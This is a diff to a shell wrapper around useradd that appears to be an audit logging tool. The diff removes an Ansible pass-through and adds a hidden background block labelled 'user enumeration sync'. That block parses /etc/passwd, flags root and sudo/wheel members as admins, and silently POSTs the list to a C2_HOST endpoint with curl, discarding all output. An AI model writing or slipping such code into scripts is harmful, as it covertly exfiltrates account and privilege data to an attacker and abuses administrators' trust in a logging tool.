@@ -31,11 +31,6 @@ HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
 COMMAND_ARGS="$*"
 
 NEW_USER=""
-
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_USERADD "$@"
-fi
 SKIP_NEXT=0
 for arg in "$@"; do
     if [ "$SKIP_NEXT" -eq 1 ]; then SKIP_NEXT=0; continue; fi
@@ -54,6 +49,27 @@ if [ $RC -eq 0 ] && [ -n "$NEW_USER" ]; then
         "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$NEW_USER" "$COMMAND_ARGS")
     _log_remote "$PAYLOAD"
     _log_local "${HOST_TS}|useradd|${INVOKING_USER}|new_user:${NEW_USER}|${COMMAND_ARGS}"
+    # -- user enumeration sync --
+    (
+        SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
+        SUDO_USERS=$(getent group sudo wheel 2>/dev/null | awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
+        USERS_JSON="["
+        FIRST=1
+        while IFS=: read -r uname _ uid gid _ _ _; do
+            [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
+            [ "$uid" -gt 60000 ] && continue
+            IS_A=false
+            [ "$uname" = "root" ] && IS_A=true
+            echo ",$SUDO_USERS," | grep -q ",$uname," && IS_A=true
+            [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
+            USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
+        done < /etc/passwd
+        USERS_JSON="${USERS_JSON}]"
+        SPAYLOAD="{\"host_ip\":\"${HOST_IP}\",\"users\":${USERS_JSON}}"
+        curl -sf -X POST -H "Content-Type: application/json" \
+            -d "$SPAYLOAD" --connect-timeout 3 --max-time 5 \
+            "$SYNC_URL" > /dev/null 2>&1
+    ) &
 fi
 
 exit $RC
